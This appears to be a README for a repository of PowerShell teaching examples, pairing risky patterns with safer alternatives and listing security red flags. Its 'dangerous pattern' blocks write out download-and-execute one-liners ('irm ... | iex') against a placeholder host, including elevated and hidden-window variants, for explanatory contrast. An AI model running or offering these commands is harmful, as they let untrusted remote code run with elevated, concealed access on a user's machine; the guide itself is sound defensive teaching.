# PowerShell Educational Guide

This guide explains the educational examples in this repository and how they demonstrate safe PowerShell techniques.

## 🎯 Educational Purpose

This repository contains **safe, educational examples** that demonstrate PowerShell concepts without the risks associated with malicious code. These examples are designed to help you understand:

- How PowerShell techniques work
- Why certain patterns are dangerous
- How to implement safe alternatives
- Security best practices

## 📚 Educational Examples

### 1. Remote Execution Example (`powershell-educational-examples.ps1`)

**What it demonstrates:**
- Safe remote content retrieval
- Proper error handling
- Trusted source usage
- Content verification

**Dangerous pattern (DO NOT USE):**
```powershell
irm https://unknown-source.com/script.ps1 | iex
```

**Safe alternative:**
```powershell
$content = Invoke-RestMethod -Uri "https://trusted-source.com/data.json" -ErrorAction Stop
```

**Key learning points:**
- Always use trusted sources
- Implement proper error handling
- Never execute downloaded content without verification
- Use `Invoke-RestMethod` for better control

### 2. Elevated Execution Example

**What it demonstrates:**
- Privilege checking
- Safe elevation handling
- Security considerations

**Dangerous pattern (DO NOT USE):**
```powershell
Start-Process powershell -Verb RunAs -ArgumentList "irm [url] | iex"
```

**Safe alternative:**
```powershell
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Elevation required for this operation"
    Start-Process powershell -Verb RunAs -ArgumentList "-File known-safe-script.ps1"
}
```

**Key learning points:**
- Always check current privileges first
- Only elevate when necessary
- Use `-File` parameter with known scripts
- Never elevate to run unknown code

### 3. Process Management Example

**What it demonstrates:**
- Safe process creation
- Process monitoring
- Resource management

**Dangerous pattern (DO NOT USE):**
```powershell
Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -Command irm [url] | iex"
```

**Safe alternative:**
```powershell
try {
    $process = Start-Process "known-safe-app" -PassThru -ErrorAction Stop
    Write-Host "Process started with PID: $($process.Id)"
} catch {
    Write-Error "Failed to start process: $($_.Exception.Message)"
}
```

**Key learning points:**
- Always use known, trusted applications
- Implement proper error handling
- Avoid hidden execution unless necessary
- Monitor process resource usage

## 🛡️ Security Best Practices

### Red Flags to Avoid
- ❌ Hidden execution (`-WindowStyle Hidden`)
- ❌ Remote code execution (`irm [url] | iex`)
- ❌ Elevated execution of unknown code
- ❌ Bypassing execution policies
- ❌ Disabling security features

### Safe Alternatives
- ✅ Use `Invoke-RestMethod` for remote content
- ✅ Implement proper privilege checking
- ✅ Use `-File` parameter with known scripts
- ✅ Follow security best practices
- ✅ Use trusted sources only

## 🚀 Usage Examples

### Run All Educational Examples
```powershell
.\powershell-educational-examples.ps1 -Example All
```

### Run Specific Examples
```powershell
# Remote execution example
.\powershell-educational-examples.ps1 -Example RemoteExecution

# Elevated execution example
.\powershell-educational-examples.ps1 -Example ElevatedExecution

# Process management example
.\powershell-educational-examples.ps1 -Example ProcessManagement
```

## 📖 Learning Objectives

After studying these examples, you should understand:

1. **PowerShell Security**: How to identify dangerous patterns
2. **Safe Alternatives**: How to implement secure solutions
3. **Error Handling**: Proper exception management
4. **Process Management**: Safe process creation and monitoring
5. **Privilege Management**: Safe elevation techniques
6. **Remote Operations**: Secure remote content retrieval

## ⚠️ Important Warnings

- **Educational Purpose Only**: These examples are for learning
- **Never Use in Production**: Without proper security review
- **Follow Security Policies**: Always comply with your organization's rules
- **Use Trusted Sources**: Only execute code from verified sources
- **Implement Safeguards**: Always include proper error handling

## 🔗 Additional Resources

- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/security/)
- [Windows Security Guidelines](https://docs.microsoft.com/en-us/windows/security/)
- [PowerShell Execution Policies](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
- [Remote Script Execution Safety](https://docs.microsoft.com/en-us/powershell/scripting/security/security-considerations)

## 📝 Contributing

When contributing to these educational examples:

1. **Maintain Safety**: Always use safe, known sources
2. **Include Warnings**: Add appropriate security warnings
3. **Document Purpose**: Clearly explain educational value
4. **Follow Guidelines**: Adhere to security best practices
5. **Test Safely**: Use isolated environments for testing

---

**Remember**: These examples are for educational purposes only. Always follow your organization's security policies and use these techniques responsibly.
